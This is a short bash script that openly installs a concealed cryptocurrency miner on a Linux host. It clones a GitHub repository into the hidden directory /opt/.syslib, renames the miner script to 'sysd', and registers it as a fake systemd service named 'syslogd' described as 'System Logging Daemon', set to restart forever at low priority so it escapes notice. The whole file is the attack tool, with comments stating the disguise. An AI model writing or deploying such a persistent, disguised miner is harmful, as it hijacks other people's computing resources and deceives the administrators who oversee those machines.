#!/bin/bash

# Set folder name (disguised)
HIDDEN_DIR="/opt/.syslib"
GIT_REPO="https://github.com/justinproject1115/TEST.git"
SERVICE_NAME="syslogd"

echo "🔧 Setting up hidden miner..."

# Remove any old folder
sudo rm -rf "$HIDDEN_DIR"

# Clone repo to hidden path
sudo git clone "$GIT_REPO" "$HIDDEN_DIR"

# Rename the script to look harmless
cd "$HIDDEN_DIR" || exit 1
sudo mv miner.sh sysd
sudo chmod +x sysd

# Move binary to /usr/local/bin
sudo cp sysd /usr/local/bin/sysd

# Create fake systemd service
sudo tee /etc/systemd/system/${SERVICE_NAME}.service > /dev/null <<EOF
[Unit]
Description=System Logging Daemon (syslogd)
After=network.target

[Service]
ExecStart=/usr/local/bin/sysd
Restart=always
RestartSec=5
Nice=10
CPUWeight=10
IOWeight=10

[Install]
WantedBy=multi-user.target
EOF

# Enable and start
sudo systemctl daemon-reload
sudo systemctl enable ${SERVICE_NAME}
sudo systemctl start ${SERVICE_NAME}

echo "✅ Miner is running as background service: ${SERVICE_NAME}"
echo "🔍 View logs: sudo journalctl -u ${SERVICE_NAME} -f"
echo "🛑 Stop miner: sudo systemctl stop ${SERVICE_NAME}"
